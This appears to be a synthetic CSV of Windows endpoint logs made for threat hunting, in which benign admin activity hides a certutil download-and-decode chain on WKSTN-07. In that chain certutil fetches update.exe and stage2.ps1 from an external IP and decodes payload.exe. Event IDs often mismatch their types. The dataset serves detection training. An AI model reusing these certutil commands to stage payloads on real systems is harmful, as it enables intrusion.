timestamp,host,user,event_id,event_type,parent_process,process_name,command_line,dest_ip,dest_port,bytes_out,status
2026-03-09T06:03:00,SRV-FILE-01,admin_svc,3,ProcessTerminate,explorer.exe,bitsadmin.exe,/list /allusers,10.0.0.142,445,46205,success
2026-03-09T06:05:00,WKSTN-14,admin_svc,3,NetworkConnect,explorer.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.0.182,,4358,success
2026-03-09T06:06:00,WKSTN-01,rgreen,11,ProcessCreate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.3.227,,38227,success
2026-03-09T06:06:00,SRV-FILE-01,rgreen,11,ProcessTerminate,svchost.exe,certutil.exe,-store My,10.0.0.248,445,23512,success
2026-03-09T06:07:00,WKSTN-08,svc_backup,5,NetworkConnect,services.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.1.91,445,22804,success
2026-03-09T06:08:00,WKSTN-02,dlopez,5,FileCreate,explorer.exe,bitsadmin.exe,/list /allusers,10.0.5.60,445,41463,success
2026-03-09T06:09:00,WKSTN-05,kpatel,1,ProcessCreate,cmd.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.4.35,135,30229,success
2026-03-09T06:11:00,WKSTN-01,dlopez,3,ProcessTerminate,cmd.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.5.114,3389,46746,success
2026-03-09T06:14:00,WKSTN-02,admin_svc,1,ProcessCreate,services.exe,certutil.exe,-store My,10.0.0.251,3389,8741,success
2026-03-09T06:14:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -urlcache -split -f http://185.220.101.45/update.exe C:\Windows\Temp\update.exe,185.220.101.45,80,1113912,success
2026-03-09T06:14:12,WKSTN-07,jsmith,3,NetworkConnect,,certutil.exe,,185.220.101.45,80,26663,success
2026-03-09T06:15:00,SRV-FILE-01,dlopez,1,ProcessCreate,services.exe,wuauclt.exe,/detectnow,10.0.4.236,3389,10817,success
2026-03-09T06:15:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -urlcache -split -f http://185.220.101.45/stage2.ps1 C:\Users\jsmith\AppData\Roaming\stage2.ps1,185.220.101.45,80,389805,success
2026-03-09T06:15:00,WKSTN-02,svc_backup,5,ProcessTerminate,services.exe,net.exe,net user /domain,10.0.0.120,,20428,success
2026-03-09T06:15:00,WKSTN-02,svc_backup,11,FileCreate,explorer.exe,taskmgr.exe,,10.0.4.98,135,886,success
2026-03-09T06:15:03,WKSTN-07,jsmith,3,NetworkConnect,,certutil.exe,,185.220.101.45,80,25622,success
2026-03-09T06:17:00,WKSTN-01,svc_backup,5,ProcessCreate,cmd.exe,certutil.exe,-store My,10.0.2.172,135,14540,success
2026-03-09T06:17:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -decode C:\Users\jsmith\AppData\Roaming\encoded.txt C:\Windows\Temp\payload.exe,,,,success
2026-03-09T06:23:00,WKSTN-08,dlopez,11,ProcessTerminate,svchost.exe,robocopy.exe,C:\data \\fileserver\backup /MIR,10.0.5.27,443,22114,success
